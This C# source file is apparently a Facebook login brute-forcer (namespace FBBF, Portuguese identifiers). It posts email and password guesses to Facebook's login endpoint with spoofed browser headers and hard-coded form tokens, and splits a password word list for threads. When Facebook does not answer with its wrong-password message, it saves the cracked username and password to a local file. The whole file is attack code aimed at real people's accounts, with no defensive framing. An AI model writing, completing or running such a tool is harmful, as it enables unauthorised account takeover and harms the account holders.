using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FBBF
{
    public class API
    {

        public static List<String> WordListCompleta { get; set; }
        public List<String> ThreadWordList { get; set; }
        public static String User { get; set; }



        public async void StartFBBF()
        {

            String user = User;
            String senha = String.Empty;
            try
            {
                senha = await StartBruteForceForThread(user, senha);
            }
            catch (Exception)
            {
            }
        }

        public static async Task<string> StartBruteForceForThread(string user, string senha)
        {
            try
            {
                var baseAddress = new Uri("https://www.facebook.com/");
                var cookieContainer = new CookieContainer();
                using (var handler = new HttpClientHandler()
                {
                    CookieContainer = cookieContainer,
                    UseCookies = true
                })

                using (var client = new HttpClient(handler))
                {
                    client.BaseAddress = baseAddress;
                    cookieContainer.Add(baseAddress, new Cookie("wd", "1366x638"));

                    addHeadersFacebookByClient(client);

                    var values = new Dictionary<string, string>
                    {
                        { "lsd", "AVqddp5U" },
                        { "timezone", "180" },
                        { "lgndim", "eyJ3IjoxMzY2LCJoIjo3NjgsImF3IjoxMzY2LCJhaCI6NzI4LCJjIjoyNH0%3D" },
                        { "lgnrnd", "070734_EnYO" },
                        { "lgnjs", "1492524456" },
                        { "ab_test_data", "AAA%2FqffVKAVVAAAAAAAAAAAAAAAAAAAAKAAAAAAAS%2FbEAAAAAAMAAB" },
                        { "locale", "pt_BR" },
                        { "email", user },
                        { "pass", senha },
                    };
                    var content = new FormUrlEncodedContent(values);

                    var response = await client.PostAsync("/login.php", content);

                    if (!response.Content.ReadAsStringAsync().Result.Contains("A senha inserida"))
                    {
                        StreamWriter sw = new StreamWriter(@"C:\fb bf\SenhaUsuario.txt");
                        sw.WriteLine(user);
                        sw.WriteLine(senha);
                        sw.Close();
                        Environment.Exit(0);
                    }
                }
            }
            catch (Exception)
            {
            }

            return senha;
        }

        private static void addHeadersFacebookByClient(HttpClient client)
        {
            client.DefaultRequestHeaders.Host = "www.facebook.com";
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36");
        }

        public static IEnumerable<List<T>> SplitList<T>(List<T> list, int nSize = 30)
        {
            for (int i = 0; i < list.Count; i += nSize)
            {
                yield return list.GetRange(i, Math.Min(nSize, list.Count - i));
            }
        }

    }
}
